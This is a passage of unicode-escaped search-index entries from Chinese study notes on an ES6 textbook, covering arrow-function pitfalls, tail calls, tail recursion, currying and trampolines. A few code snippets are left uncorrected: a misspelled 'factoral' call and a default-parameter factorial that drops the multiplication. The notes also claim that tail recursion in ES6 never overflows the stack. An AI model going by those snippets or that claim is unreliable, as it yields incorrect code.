<p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>cat.jumps()</code>\u65b9\u6cd5\u662f\u4e00\u4e2a\u7bad\u5934\u51fd\u6570\uff0c\u8fd9\u662f\u9519\u8bef\u7684\u3002\u8c03\u7528<code>cat.jumps()</code>\u65f6\uff0c\u5982\u679c\u662f\u666e\u901a\u51fd\u6570\uff0c\u8be5\u65b9\u6cd5\u5185\u90e8\u7684<code>this</code>\u6307\u5411<code>cat</code>\uff1b\u5982\u679c\u5199\u6210\u4e0a\u9762\u90a3\u6837\u7684\u7bad\u5934\u51fd\u6570\uff0c\u4f7f\u5f97<code>this</code>\u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff0c\u56e0\u6b64\u4e0d\u4f1a\u5f97\u5230\u9884\u671f\u7ed3\u679c\u3002\u8fd9\u662f\u56e0\u4e3a\u5bf9\u8c61\u4e0d\u6784\u6210\u5355\u72ec\u7684\u4f5c\u7528\u57df\uff0c\u5bfc\u81f4<code>jumps</code>\u7bad\u5934\u51fd\u6570\u5b9a\u4e49\u65f6\u7684\u4f5c\u7528\u57df\u5c31\u662f\u5168\u5c40\u4f5c\u7528\u57df\u3002</p> <p>\u7b2c\u4e8c\u4e2a\u573a\u5408\u662f==\u9700\u8981\u52a8\u6001<code>this</code>\u7684\u65f6\u5019==\uff0c\u4e5f\u4e0d\u5e94\u4f7f\u7528\u7bad\u5934\u51fd\u6570\u3002\uff08\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\uff0c\u76d1\u542c\u7684\u5bf9\u8c61\u662f\u8c03\u7528\u51fd\u6570\u7684\u5bf9\u8c61\uff09</p> <pre><code>var button = document.getElementById('press');\nbutton.addEventListener('click', () =&gt; {\n  this.classList.toggle('on');\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8fd0\u884c\u65f6\uff0c\u70b9\u51fb\u6309\u94ae\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a<code>button</code>\u7684\u76d1\u542c\u51fd\u6570\u662f\u4e00\u4e2a\u7bad\u5934\u51fd\u6570\uff0c\u5bfc\u81f4\u91cc\u9762\u7684<code>this</code>\u5c31\u662f\u5168\u5c40\u5bf9\u8c61\u3002\u5982\u679c\u6539\u6210\u666e\u901a\u51fd\u6570\uff0c<code>this</code>\u5c31\u4f1a\u52a8\u6001\u6307\u5411\u88ab\u70b9\u51fb\u7684\u6309\u94ae\u5bf9\u8c61\u3002</p> <p>\u53e6\u5916\uff0c\u5982\u679c==\u51fd\u6570\u4f53\u5f88\u590d\u6742\uff0c\u6709\u8bb8\u591a\u884c\uff0c\u6216\u8005\u51fd\u6570\u5185\u90e8\u6709\u5927\u91cf\u7684\u8bfb\u5199\u64cd\u4f5c==\uff0c\u4e0d\u5355\u7eaf\u662f\u4e3a\u4e86\u8ba1\u7b97\u503c\uff0c\u8fd9\u65f6\u4e5f\u4e0d\u5e94\u8be5\u4f7f\u7528\u7bad\u5934\u51fd\u6570\uff0c\u800c\u662f\u8981\u4f7f\u7528\u666e\u901a\u51fd\u6570\uff0c\u8fd9\u6837\u53ef\u4ee5\u63d0\u9ad8\u4ee3\u7801\u53ef\u8bfb\u6027\u3002</p>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_13","title":"\u5d4c\u5957\u7684\u7bad\u5934\u51fd\u6570","text":"<p>\u7bad\u5934\u51fd\u6570\u5185\u90e8\uff0c\u8fd8\u53ef\u4ee5\u518d\u4f7f\u7528\u7bad\u5934\u51fd\u6570\u3002</p> <pre><code>let insert = (value) =&gt; ({\n  into: (array) =&gt; ({\n    after: (afterValue) =&gt; {\n      array.splice(array.indexOf(afterValue) + 1, 0, value);\n      return array;\n    }\n  });\n});\n\ninsert(2).into([1, 3]).after(1); //[1, 2, 3]\n</code></pre> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u90e8\u7f72\u7ba1\u9053\u673a\u5236\uff08pipeline\uff09\u7684\u4f8b\u5b50\uff0c\u5373\u524d\u4e00\u4e2a\u51fd\u6570\u7684\u8f93\u51fa\u662f\u540e\u4e00\u4e2a\u51fd\u6570\u7684\u8f93\u5165\u3002</p> <pre><code>const plus1 = a =&gt; a + 1;\nconst mult2 = a =&gt; a * 2;\n\nmult2(plus1(5))\n// 12\n</code></pre> <p>\u7bad\u5934\u51fd\u6570\u8fd8\u6709\u4e00\u4e2a\u529f\u80fd\uff0c\u5c31\u662f\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u6539\u5199 \u03bb \u6f14\u7b97\uff08\u4e0d\u61c2\uff09\u3002</p> <pre><code>// \u03bb\u6f14\u7b97\u7684\u5199\u6cd5\nfix = \u03bbf.(\u03bbx.f(\u03bbv.x(x)(v)))(\u03bbx.f(\u03bbv.x(x)(v)))\n\n// ES6\u7684\u5199\u6cd5\nvar fix = f =&gt; (x =&gt; f(v =&gt; x(x)(v)))\n               (x =&gt; f(v =&gt; x(x)(v)));\n</code></pre>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_14","title":"\u5c3e\u8c03\u7528\u4f18\u5316:\u91cd\u70b9\u96be\u70b9","text":""},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_15","title":"\u5c3e\u8c03\u7528","text":"<p>\u5c3e\u8c03\u7528\uff08Tail Call\uff09\u662f\u51fd\u6570\u5f0f\u7f16\u7a0b\u7684\u4e00\u4e2a\u91cd\u8981\u6982\u5ff5\uff0c\u5c31\u662f\u6307\u67d0\u4e2a\u51fd\u6570\u7684\u6700\u540e\u4e00\u6b65\u662f\u8c03\u7528\u53e6\u4e00\u4e2a\u51fd\u6570\uff08\u4e00\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u53e6\u4e00\u4e2a\u51fd\u6570\u7684\u7ed3\u679c\uff09\u3002\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570<code>f</code>\u7684\u6700\u540e\u4e00\u6b65\u662f\u8c03\u7528\u51fd\u6570<code>g</code>\uff0c\u8fd9\u5c31\u53eb\u5c3e\u8c03\u7528\u3002</p> <pre><code>function f(x){\n  // code \n  return g(x);\n}\n</code></pre> <p>\u4ee5\u4e0b\u4e09\u79cd\u60c5\u51b5\uff0c\u90fd\u4e0d\u5c5e\u4e8e\u5c3e\u8c03\u7528\u3002</p> <pre><code>// \u60c5\u51b5\u4e00\nfunction f(x){\n  let y = g(x);\n  return y;\n}\n\n// \u60c5\u51b5\u4e8c\nfunction f(x){\n  return g(x) + 1;\n}\n\n// \u60c5\u51b5\u4e09\nfunction f(x){\n  g(x);\n}\n</code></pre> <p>\u5c3e\u8c03\u7528\u4e0d\u4e00\u5b9a\u51fa\u73b0\u5728\u51fd\u6570\u5c3e\u90e8\uff0c\u53ea\u8981\u662f\u6700\u540e\u4e00\u6b65\u64cd\u4f5c\u5373\u53ef\u3002</p> <pre><code>function f(x) {\n  if (x &gt; 0) {\n    return m(x)\n  }\n  return n(x);\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570<code>m</code>\u548c<code>n</code>\u90fd\u5c5e\u4e8e\u5c3e\u8c03\u7528\uff0c\u56e0\u4e3a\u5b83\u4eec\u90fd\u662f\u51fd\u6570<code>f</code>\u7684\u6700\u540e\u4e00\u6b65\u64cd\u4f5c\u3002</p>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_16","title":"\u5c3e\u8c03\u7528\u4f18\u5316","text":"<p>\u5c3e\u8c03\u7528\u4e4b\u6240\u4ee5\u4e0e\u5176\u4ed6\u8c03\u7528\u4e0d\u540c\uff0c\u5c31\u5728\u4e8e\u5b83\u7684\u7279\u6b8a\u7684\u8c03\u7528\u4f4d\u7f6e\u3002</p> <p>\u6211\u4eec\u77e5\u9053\uff0c\u51fd\u6570\u8c03\u7528\u4f1a\u5728\u5185\u5b58\u5f62\u6210\u4e00\u4e2a\u201c\u8c03\u7528\u8bb0\u5f55\u201d\uff0c\u53c8\u79f0\u201c\u8c03\u7528\u5e27\u201d\uff08call frame\uff09\uff0c\u4fdd\u5b58\u8c03\u7528\u4f4d\u7f6e\u548c\u5185\u90e8\u53d8\u91cf\u7b49\u4fe1\u606f\u3002\u5982\u679c\u5728\u51fd\u6570<code>A</code>\u7684\u5185\u90e8\u8c03\u7528\u51fd\u6570<code>B</code>\uff0c\u90a3\u4e48\u5728<code>A</code>\u7684\u8c03\u7528\u5e27\u4e0a\u65b9\uff0c\u8fd8\u4f1a\u5f62\u6210\u4e00\u4e2a<code>B</code>\u7684\u8c03\u7528\u5e27\u3002\u7b49\u5230<code>B</code>\u8fd0\u884c\u7ed3\u675f\uff0c\u5c06\u7ed3\u679c\u8fd4\u56de\u5230<code>A</code>\uff0c<code>B</code>\u7684\u8c03\u7528\u5e27\u624d\u4f1a\u6d88\u5931\u3002\u5982\u679c\u51fd\u6570<code>B</code>\u5185\u90e8\u8fd8\u8c03\u7528\u51fd\u6570<code>C</code>\uff0c\u90a3\u5c31\u8fd8\u6709\u4e00\u4e2a<code>C</code>\u7684\u8c03\u7528\u5e27\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\u6240\u6709\u7684\u8c03\u7528\u5e27\uff0c\u5c31\u5f62\u6210\u4e00\u4e2a\u201c\u8c03\u7528\u6808\u201d\uff08call stack\uff09\u3002</p> <p>\u5c3e\u8c03\u7528\u7531\u4e8e\u662f\u51fd\u6570\u7684\u6700\u540e\u4e00\u6b65\u64cd\u4f5c\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u4fdd\u7559\u5916\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5e27\uff0c\u56e0\u4e3a\u8c03\u7528\u4f4d\u7f6e\u3001\u5185\u90e8\u53d8\u91cf\u7b49\u4fe1\u606f\u90fd\u4e0d\u4f1a\u518d\u7528\u5230\u4e86\uff0c\u53ea\u8981\u76f4\u63a5\u7528\u5185\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5e27\uff0c\u53d6\u4ee3\u5916\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5e27\u5c31\u53ef\u4ee5\u4e86\u3002</p> <pre><code>function f() {\n  let m = 1;\n  let n = 2;\n  return g(m + n);\n}\nf();\n\n// \u7b49\u540c\u4e8e\uff08\u6240\u4ee5mn\u53d8\u91cf\u5360\u636e\u7684\u5185\u5b58\u53ef\u4ee5\u91ca\u653e\uff09\nfunction f() {\n  return g(3);\n}\nf();\n\n// \u7b49\u540c\u4e8e\uff08\u6240\u4ee5\u51fd\u6570f\u5360\u7528\u7684\u5185\u5b58\u5806\u6808\u5c31\u53ef\u4ee5\u91ca\u653e\uff0c\u4fdd\u7559g\u51fd\u6570\u7684\u5185\u5bb9\u5806\u6808\uff09\ng(3);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u51fd\u6570<code>g</code>\u4e0d\u662f\u5c3e\u8c03\u7528\uff0c\u51fd\u6570<code>f</code>\u5c31\u9700\u8981\u4fdd\u5b58\u5185\u90e8\u53d8\u91cf<code>m</code>\u548c<code>n</code>\u7684\u503c\u3001<code>g</code>\u7684\u8c03\u7528\u4f4d\u7f6e\u7b49\u4fe1\u606f\u3002\u4f46\u7531\u4e8e\u8c03\u7528<code>g</code>\u4e4b\u540e\uff0c\u51fd\u6570<code>f</code>\u5c31\u7ed3\u675f\u4e86\uff0c\u6240\u4ee5\u6267\u884c\u5230\u6700\u540e\u4e00\u6b65\uff0c\u5b8c\u5168\u53ef\u4ee5\u5220\u9664<code>f(x)</code>\u7684\u8c03\u7528\u5e27\uff0c\u53ea\u4fdd\u7559<code>g(3)</code>\u7684\u8c03\u7528\u5e27\u3002</p> <p>\u8fd9\u5c31\u53eb\u505a\u201c\u5c3e\u8c03\u7528\u4f18\u5316\u201d\uff08Tail call optimization\uff09\uff0c\u5373\u53ea\u4fdd\u7559\u5185\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5e27\u3002\u5982\u679c\u6240\u6709\u51fd\u6570\u90fd\u662f\u5c3e\u8c03\u7528\uff0c\u90a3\u4e48\u5b8c\u5168\u53ef\u4ee5\u505a\u5230\u6bcf\u6b21\u6267\u884c\u65f6\uff0c\u8c03\u7528\u5e27\u53ea\u6709\u4e00\u9879\uff0c\u8fd9\u5c06\u5927\u5927\u8282\u7701\u5185\u5b58\u3002\u8fd9\u5c31\u662f\u201c\u5c3e\u8c03\u7528\u4f18\u5316\u201d\u7684\u610f\u4e49\u3002</p> <p>\u6ce8\u610f\uff0c\u53ea\u6709\u4e0d\u518d\u7528\u5230\u5916\u5c42\u51fd\u6570\u7684\u5185\u90e8\u53d8\u91cf\uff0c\u5185\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5e27\u624d\u4f1a\u53d6\u4ee3\u5916\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5e27\uff0c\u5426\u5219\u5c31\u65e0\u6cd5\u8fdb\u884c\u201c\u5c3e\u8c03\u7528\u4f18\u5316\u201d\u3002</p> <pre><code>function addOne(a){\n  var one = 1;\n  function inner(b){\n    return b + one;\n  }\n  return inner(a);\n}\n</code></pre> <p>\u4e0a\u9762\u7684\u51fd\u6570\u4e0d\u4f1a\u8fdb\u884c\u5c3e\u8c03\u7528\u4f18\u5316\uff0c\u56e0\u4e3a\u5185\u5c42\u51fd\u6570<code>inner</code>\u7528\u5230\u4e86\u5916\u5c42\u51fd\u6570<code>addOne</code>\u7684\u5185\u90e8\u53d8\u91cf<code>one</code>\u3002</p>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_17","title":"\u5c3e\u9012\u5f52","text":"<p>\u51fd\u6570\u8c03\u7528\u81ea\u8eab\uff0c\u79f0\u4e3a\u9012\u5f52\u3002\u5982\u679c\u5c3e\u8c03\u7528\u81ea\u8eab\uff0c\u5c31\u79f0\u4e3a\u5c3e\u9012\u5f52\u3002</p> <p>\u9012\u5f52\u975e\u5e38\u8017\u8d39\u5185\u5b58\uff0c\u56e0\u4e3a\u9700\u8981\u540c\u65f6\u4fdd\u5b58\u6210\u5343\u4e0a\u767e\u4e2a\u8c03\u7528\u5e27\uff0c\u5f88\u5bb9\u6613\u53d1\u751f\u201c\u6808\u6ea2\u51fa\u201d\u9519\u8bef\uff08stack overflow\uff09\u3002\u4f46\u5bf9\u4e8e\u5c3e\u9012\u5f52\u6765\u8bf4\uff0c\u7531\u4e8e\u53ea\u5b58\u5728\u4e00\u4e2a\u8c03\u7528\u5e27\uff0c\u6240\u4ee5\u6c38\u8fdc\u4e0d\u4f1a\u53d1\u751f\u201c\u6808\u6ea2\u51fa\u201d\u9519\u8bef\u3002</p> <pre><code>function factorial(n) {\n  if (n === 1) return 1;\n  return n * factorial(n - 1);\n}\n\nfactorial(5) // 120\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u662f\u4e00\u4e2a\u9636\u4e58\u51fd\u6570\uff0c\u8ba1\u7b97<code>n</code>\u7684\u9636\u4e58\uff0c\u6700\u591a\u9700\u8981\u4fdd\u5b58<code>n</code>\u4e2a\u8c03\u7528\u8bb0\u5f55\uff0c\u590d\u6742\u5ea6 O(n) \u3002</p> <p>\u5982\u679c\u6539\u5199\u6210\u5c3e\u9012\u5f52\uff0c\u53ea\u4fdd\u7559\u4e00\u4e2a\u8c03\u7528\u8bb0\u5f55\uff0c\u590d\u6742\u5ea6 O(1) \u3002</p> <pre><code>function factorial(n, total) {\n  if (n === 1) return total;\n  return factorial(n - 1, n * total);\n}\n\nfactorial(5, 1) // 120\n\nfunction factorial(n, total) {\n  if (n ===1) return total;\n  return factoral(n - 1, n * total);\n}\n</code></pre> <p>\u8fd8\u6709\u4e00\u4e2a\u6bd4\u8f83\u8457\u540d\u7684\u4f8b\u5b50\uff0c\u5c31\u662f\u8ba1\u7b97 Fibonacci \u6570\u5217\uff0c\u4e5f\u80fd\u5145\u5206\u8bf4\u660e\u5c3e\u9012\u5f52\u4f18\u5316\u7684\u91cd\u8981\u6027\u3002</p> <p>\u975e\u5c3e\u9012\u5f52\u7684 Fibonacci \u6570\u5217\u5b9e\u73b0\u5982\u4e0b\u3002</p> <pre><code>function Fibonacci (n) {\n  if ( n &lt;= 1 ) {return 1};\n\n  return Fibonacci(n - 1) + Fibonacci(n - 2);\n}\n\nFibonacci(10) // 89\nFibonacci(100) // \u8d85\u65f6\nFibonacci(500) // \u8d85\u65f6\n</code></pre> <p>\u5c3e\u9012\u5f52\u4f18\u5316\u8fc7\u7684 Fibonacci \u6570\u5217\u5b9e\u73b0\u5982\u4e0b\u3002</p> <pre><code>function Fibonacci2 (n , ac1 = 1 , ac2 = 1) {\n  if( n &lt;= 1 ) {return ac2};\n  return Fibonacci2 (n - 1, ac2, ac1 + ac2);\n}\n\nfunction Fibonacci (n, ac1 = 1, ac2 = 1) {\n  if (n &lt;= 1) {return ac2};\n  // \u8fd9\u91cc\u5c3e\u9012\u5f52\u7684\u51fd\u6570\u53c2\u6570\u662f\u8fd9\u4e2a\u51fd\u6570\u76f4\u63a5\u4f20\u5165\u7684\u53c2\u6570\uff0c\u5982\u679c\u7ecf\u8fc7\u4e2d\u95f4\u5904\u7406\uff0c\u5728\u9012\u5f52\u8c03\u7528\u8fd8\u5728\u5185\u5b58\u4e2d\n  return Fibonacci(n - 1, ac2, ac1 + ac2);\n}\n\nFibonacci2(100) // 573147844013817200000\nFibonacci2(1000) // 7.0330367711422765e+208\nFibonacci2(10000) // Infinity\n</code></pre> <p>\u7531\u6b64\u53ef\u89c1\uff0c\u201c\u5c3e\u8c03\u7528\u4f18\u5316\u201d\u5bf9\u9012\u5f52\u64cd\u4f5c\u610f\u4e49\u91cd\u5927\uff0c\u6240\u4ee5\u4e00\u4e9b\u51fd\u6570\u5f0f\u7f16\u7a0b\u8bed\u8a00\u5c06\u5176\u5199\u5165\u4e86\u8bed\u8a00\u89c4\u683c\u3002ES6 \u4ea6\u662f\u5982\u6b64\uff0c\u7b2c\u4e00\u6b21\u660e\u786e\u89c4\u5b9a\uff0c\u6240\u6709 ECMAScript \u7684\u5b9e\u73b0\uff0c\u90fd\u5fc5\u987b\u90e8\u7f72\u201c\u5c3e\u8c03\u7528\u4f18\u5316\u201d\u3002\u8fd9\u5c31\u662f\u8bf4\uff0cES6 \u4e2d\u53ea\u8981\u4f7f\u7528\u5c3e\u9012\u5f52\uff0c\u5c31\u4e0d\u4f1a\u53d1\u751f\u6808\u6ea2\u51fa\uff08\u6216\u8005\u5c42\u5c42\u9012\u5f52\u9020\u6210\u7684\u8d85\u65f6\uff09\uff0c\u76f8\u5bf9\u8282\u7701\u5185\u5b58\u3002</p>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_18","title":"\u9012\u5f52\u51fd\u6570\u7684\u6539\u5199","text":"<p>\u5c3e\u9012\u5f52\u7684\u5b9e\u73b0\uff0c\u5f80\u5f80\u9700\u8981\u6539\u5199\u9012\u5f52\u51fd\u6570\uff0c\u786e\u4fdd\u6700\u540e\u4e00\u6b65\u53ea\u8c03\u7528\u81ea\u8eab\u3002\u505a\u5230\u8fd9\u4e00\u70b9\u7684\u65b9\u6cd5\uff0c\u5c31\u662f==\u628a\u6240\u6709\u7528\u5230\u7684\u5185\u90e8\u53d8\u91cf\u6539\u5199\u6210\u51fd\u6570\u7684\u53c2\u6570==\u3002\u6bd4\u5982\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u9636\u4e58\u51fd\u6570 factorial \u9700\u8981\u7528\u5230\u4e00\u4e2a\u4e2d\u95f4\u53d8\u91cf<code>total</code>\uff0c\u90a3\u5c31\u628a\u8fd9\u4e2a\u4e2d\u95f4\u53d8\u91cf\u6539\u5199\u6210\u51fd\u6570\u7684\u53c2\u6570\u3002\u8fd9\u6837\u505a\u7684\u7f3a\u70b9\u5c31\u662f\u4e0d\u592a\u76f4\u89c2\uff0c\u7b2c\u4e00\u773c\u5f88\u96be\u770b\u51fa\u6765\uff0c\u4e3a\u4ec0\u4e48\u8ba1\u7b97<code>5</code>\u7684\u9636\u4e58\uff0c\u9700\u8981\u4f20\u5165\u4e24\u4e2a\u53c2\u6570<code>5</code>\u548c<code>1</code>\uff1f</p> <p>\u4e24\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\u65b9\u6cd5\u4e00\u662f\u5728\u5c3e\u9012\u5f52\u51fd\u6570\u4e4b\u5916\uff0c\u518d\u63d0\u4f9b\u4e00\u4e2a\u6b63\u5e38\u5f62\u5f0f\u7684\u51fd\u6570\u3002</p> <pre><code>function tailFactorial(n, total) {\n  if (n === 1) return total;\n  return tailFactorial(n - 1, n * total);\n}\n\nfunction factorial(n) {\n  return tailFactorial(n, 1);\n}\n\nfactorial(5) // 120\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u901a\u8fc7\u4e00\u4e2a\u6b63\u5e38\u5f62\u5f0f\u7684\u9636\u4e58\u51fd\u6570<code>factorial</code>\uff0c\u8c03\u7528\u5c3e\u9012\u5f52\u51fd\u6570<code>tailFactorial</code>\uff0c\u770b\u8d77\u6765\u5c31\u6b63\u5e38\u591a\u4e86\u3002</p> <p>\u51fd\u6570\u5f0f\u7f16\u7a0b\u6709\u4e00\u4e2a\u6982\u5ff5\uff0c\u53eb\u505a==\u67ef\u91cc\u5316==\uff08currying\uff09\uff0c\u610f\u601d\u662f==\u5c06\u591a\u53c2\u6570\u7684\u51fd\u6570\u8f6c\u6362\u6210\u5355\u53c2\u6570\u7684\u5f62\u5f0f==\u3002</p> <pre><code>function currying(fn, n) {\n  return function (m) {\n    return fn.call(this, m, n);\n  };\n}\n\nfunction tailFactorial(n, total) {\n  if (n === 1) return total;\n  return tailFactorial(n - 1, n * total);\n}\n\nconst factorial = currying(tailFactorial, 1);\n\nfactorial(5) // 120\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u901a\u8fc7\u67ef\u91cc\u5316\uff0c\u5c06\u5c3e\u9012\u5f52\u51fd\u6570<code>tailFactorial</code>\u53d8\u4e3a\u53ea\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\u7684<code>factorial</code>\u3002</p> <p>\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u5c31\u7b80\u5355\u591a\u4e86\uff0c\u5c31\u662f\u91c7\u7528 ES6 \u7684\u51fd\u6570\u9ed8\u8ba4\u503c\u3002</p> <pre><code>function factorial(n, total = 1) {\n  if (n === 1) return total;\n  return factorial(n - 1, n * total);\n}\n\nfactorial(5) // 120\n\nfunction factorial(n, total = 1) {\n  if (n === 1) return total;\n  return factorial(n - 1, total);\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53c2\u6570<code>total</code>\u6709\u9ed8\u8ba4\u503c<code>1</code>\uff0c\u6240\u4ee5\u8c03\u7528\u65f6\u4e0d\u7528\u63d0\u4f9b\u8fd9\u4e2a\u503c\u3002</p> <p>\u603b\u7ed3\u4e00\u4e0b\uff0c\u9012\u5f52\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u5faa\u73af\u64cd\u4f5c\u3002\u7eaf\u7cb9\u7684\u51fd\u6570\u5f0f\u7f16\u7a0b\u8bed\u8a00\u6ca1\u6709\u5faa\u73af\u64cd\u4f5c\u547d\u4ee4\uff0c\u6240\u6709\u7684\u5faa\u73af\u90fd\u7528\u9012\u5f52\u5b9e\u73b0\uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u5c3e\u9012\u5f52\u5bf9\u8fd9\u4e9b\u8bed\u8a00\u6781\u5176\u91cd\u8981\u3002\u5bf9\u4e8e\u5176\u4ed6\u652f\u6301\u201c\u5c3e\u8c03\u7528\u4f18\u5316\u201d\u7684\u8bed\u8a00\uff08\u6bd4\u5982 Lua\uff0cES6\uff09\uff0c\u53ea\u9700\u8981\u77e5\u9053==\u5faa\u73af\u53ef\u4ee5\u7528\u9012\u5f52\u4ee3\u66ff\uff0c\u800c\u4e00\u65e6\u4f7f\u7528\u9012\u5f52\uff0c\u5c31\u6700\u597d\u4f7f\u7528\u5c3e\u9012\u5f52==\u3002</p>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_19","title":"\u4e25\u683c\u6a21\u5f0f","text":"<p>ES6 \u7684\u5c3e\u8c03\u7528\u4f18\u5316\u53ea\u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\u5f00\u542f\uff0c\u6b63\u5e38\u6a21\u5f0f\u662f\u65e0\u6548\u7684\u3002</p> <p>\u8fd9\u662f\u56e0\u4e3a\u5728\u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c\u51fd\u6570\u5185\u90e8\u6709\u4e24\u4e2a\u53d8\u91cf\uff0c\u53ef\u4ee5\u8ddf\u8e2a\u51fd\u6570\u7684\u8c03\u7528\u6808\u3002</p> <ul> <li><code>func.arguments</code>\uff1a\u8fd4\u56de\u8c03\u7528\u65f6\u51fd\u6570\u7684\u53c2\u6570\u3002</li> <li><code>func.caller</code>\uff1a\u8fd4\u56de\u8c03\u7528\u5f53\u524d\u51fd\u6570\u7684\u90a3\u4e2a\u51fd\u6570\u3002</li> </ul> <p>\u5c3e\u8c03\u7528\u4f18\u5316\u53d1\u751f\u65f6\uff0c\u51fd\u6570\u7684\u8c03\u7528\u6808\u4f1a\u6539\u5199\uff0c\u56e0\u6b64\u4e0a\u9762\u4e24\u4e2a\u53d8\u91cf\u5c31\u4f1a\u5931\u771f\u3002\u4e25\u683c\u6a21\u5f0f\u7981\u7528\u8fd9\u4e24\u4e2a\u53d8\u91cf\uff0c\u6240\u4ee5\u5c3e\u8c03\u7528\u6a21\u5f0f\u4ec5\u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\u751f\u6548\u3002</p> <pre><code>function restricted() {\n  'use strict';\n  restricted.caller;    // \u62a5\u9519\n  restricted.arguments; // \u62a5\u9519\n}\nrestricted();\n</code></pre>"},{"location":"ebook-JSES6-RYF/08-%E5%87%BD%E6%95%B0/#_20","title":"\u5c3e\u9012\u5f52\u4f18\u5316\u7684\u5b9e\u73b0","text":"<p>\u5c3e\u9012\u5f52\u4f18\u5316\u53ea\u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\u751f\u6548\uff0c\u90a3\u4e48\u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c\u6216\u8005\u90a3\u4e9b\u4e0d\u652f\u6301\u8be5\u529f\u80fd\u7684\u73af\u5883\u4e2d\uff0c\u6709\u6ca1\u6709\u529e\u6cd5\u4e5f\u4f7f\u7528\u5c3e\u9012\u5f52\u4f18\u5316\u5462\uff1f\u56de\u7b54\u662f\u53ef\u4ee5\u7684\uff0c\u5c31\u662f\u81ea\u5df1\u5b9e\u73b0\u5c3e\u9012\u5f52\u4f18\u5316\u3002</p> <p>\u5b83\u7684\u539f\u7406\u975e\u5e38\u7b80\u5355\u3002\u5c3e\u9012\u5f52\u4e4b\u6240\u4ee5\u9700\u8981\u4f18\u5316\uff0c\u539f\u56e0\u662f\u8c03\u7528\u6808\u592a\u591a\uff0c\u9020\u6210\u6ea2\u51fa\uff0c\u90a3\u4e48\u53ea\u8981\u51cf\u5c11\u8c03\u7528\u6808\uff0c\u5c31\u4e0d\u4f1a\u6ea2\u51fa\u3002\u600e\u4e48\u505a\u53ef\u4ee5\u51cf\u5c11\u8c03\u7528\u6808\u5462\uff1f\u5c31\u662f==\u91c7\u7528\u201c\u5faa\u73af\u201d\u6362\u6389\u201c\u9012\u5f52\u201d==\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u6b63\u5e38\u7684\u9012\u5f52\u51fd\u6570\u3002</p> <pre><code>function sum(x, y) {\n  if (y &gt; 0) {\n    return sum(x + 1, y - 1);\n  } else {\n    return x;\n  }\n}\n\nsum(1, 100000)\n// Uncaught RangeError: Maximum call stack size exceeded(\u2026)\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>sum</code>\u662f\u4e00\u4e2a\u9012\u5f52\u51fd\u6570\uff0c\u53c2\u6570<code>x</code>\u662f\u9700\u8981\u7d2f\u52a0\u7684\u503c\uff0c\u53c2\u6570<code>y</code>\u63a7\u5236\u9012\u5f52\u6b21\u6570\u3002\u4e00\u65e6\u6307\u5b9a<code>sum</code>\u9012\u5f52 100000 \u6b21\uff0c\u5c31\u4f1a\u62a5\u9519\uff0c\u63d0\u793a\u8d85\u51fa\u8c03\u7528\u6808\u7684\u6700\u5927\u6b21\u6570\u3002</p> <p>\u8e66\u5e8a\u51fd\u6570\uff08trampoline\uff09\u53ef\u4ee5\u5c06\u9012\u5f52\u6267\u884c\u8f6c\u4e3a\u5faa\u73af\u6267\u884c\u3002</p> <pre><code>function trampoline(f) {\n  while (f &amp;&amp; f instanceof Function) {\n    f = f();\n  }\n  return f;\n}\n</code></pre> 